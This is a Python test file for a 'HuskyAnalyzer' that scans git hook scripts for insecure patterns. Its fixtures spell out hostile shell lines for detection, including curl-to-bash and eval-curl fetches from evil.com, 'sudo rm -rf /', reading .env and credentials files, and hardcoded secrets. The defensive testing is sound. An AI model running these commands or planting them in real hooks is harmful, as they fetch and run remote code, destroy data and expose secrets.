"""Tests for HuskyAnalyzer."""

from pathlib import Path

from devai.husky_analyzer import HuskyAnalyzer, HuskyFinding


INSECURE_PRE_COMMIT = """\
#!/usr/bin/env sh
. "$(dirname -- "$0")/_/husky.sh"

export API_KEY=hardcoded-secret-token-12345
export DATABASE_PASSWORD=leaked-db-password

curl http://evil.com/install.sh | bash
sudo rm -rf /
chmod 777 /tmp
git push origin main --force
eval "$(curl http://evil.com/hook.sh)"
curl --insecure https://example.com
export GIT_SSL_NO_VERIFY=1
cat .env && cat credentials.json
HUSKY=0 npm test
npx eslint@latest .
npx --yes some-random-linter
"""

HARDENED_PRE_COMMIT = """\
#!/usr/bin/env sh
. "$(dirname -- "$0")/_/husky.sh"

npm test
"""

HARDENED_PRE_PUSH = """\
#!/usr/bin/env sh
. "$(dirname -- "$0")/_/husky.sh"

npm run typecheck
"""

LEGACY_PACKAGE_JSON = """\
{
  "name": "my-app",
  "scripts": {
    "prepare": "husky install"
  },
  "husky": {
    "hooks": {
      "pre-commit": "curl http://evil.com | bash",
      "pre-push": "npm test"
    }
  }
}
"""


class TestHuskyAnalyzer:
    def test_detects_insecure_hooks(self, tmp_path: Path):
        husky_dir = tmp_path / ".husky"
        husky_dir.mkdir()
        (husky_dir / "pre-commit").write_text(INSECURE_PRE_COMMIT, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "destructive_rm" in kinds
        assert "sudo_usage" in kinds
        assert "chmod_777" in kinds
        assert "force_push" in kinds
        assert "eval_usage" in kinds
        assert "insecure_http" in kinds
        assert "tls_verify_disabled" in kinds
        assert "dangerous_shell" in kinds
        assert "sensitive_path" in kinds
        assert "husky_bypass" in kinds
        assert "unpinned_npx" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_hooks_pass(self, tmp_path: Path):
        husky_dir = tmp_path / ".husky"
        husky_dir.mkdir()
        (husky_dir / "pre-commit").write_text(HARDENED_PRE_COMMIT, encoding="utf-8")
        (husky_dir / "pre-push").write_text(HARDENED_PRE_PUSH, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert not high
        assert analyzer.health_score() >= 90.0

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = HuskyAnalyzer(str(tmp_path))
        assert analyzer.hook_files() == []
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = HuskyFinding(
            kind="curl_pipe_shell",
            severity="high",
            message="piping curl/wget to shell is unsafe in git hooks",
            path=".husky/pre-commit",
            lineno=8,
            line="curl http://evil.com | bash",
        )
        assert "[high]" in finding.format()
        assert ".husky/pre-commit:8" in finding.format()

    def test_detects_missing_shebang(self, tmp_path: Path):
        husky_dir = tmp_path / ".husky"
        husky_dir.mkdir()
        (husky_dir / "pre-commit").write_text("npm test\n", encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "missing_shebang" in kinds

    def test_parses_hook_metadata(self, tmp_path: Path):
        husky_dir = tmp_path / ".husky"
        husky_dir.mkdir()
        (husky_dir / "pre-commit").write_text(HARDENED_PRE_COMMIT, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        analyzer.analyze()
        info = analyzer.info
        assert len(info.hooks) == 1
        assert info.hooks[0].name == "pre-commit"
        assert info.hooks[0].has_shebang is True

    def test_legacy_package_json_hooks(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(LEGACY_PACKAGE_JSON, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "legacy_inline_hook" in kinds
        assert "curl_pipe_shell" in kinds
        assert analyzer.stats.legacy_hooks == 2

    def test_to_context_includes_summary(self, tmp_path: Path):
        husky_dir = tmp_path / ".husky"
        husky_dir.mkdir()
        (husky_dir / "pre-commit").write_text(HARDENED_PRE_COMMIT, encoding="utf-8")
        analyzer = HuskyAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Husky analysis:" in context
        assert "health score:" in context

    def test_generate_hardened_template(self):
        analyzer = HuskyAnalyzer(".")
        template = analyzer.generate_hardened_template()
        assert "#!/usr/bin/env sh" in template
        assert "pre-commit" in template

    def test_facade_integration(self):
        from devai import DevAI

        ai = DevAI.mock()
        analyzer = ai.husky(".")
        assert isinstance(analyzer, HuskyAnalyzer)

    def test_public_api_exports(self):
        from devai import (
            HuskyAnalyzer,
            HuskyFinding,
            HuskyHookInfo,
            HuskyInfo,
            HuskyStats,
        )

        assert HuskyAnalyzer is not None
        assert HuskyFinding is not None
        assert HuskyHookInfo is not None
        assert HuskyInfo is not None
        assert HuskyStats is not None
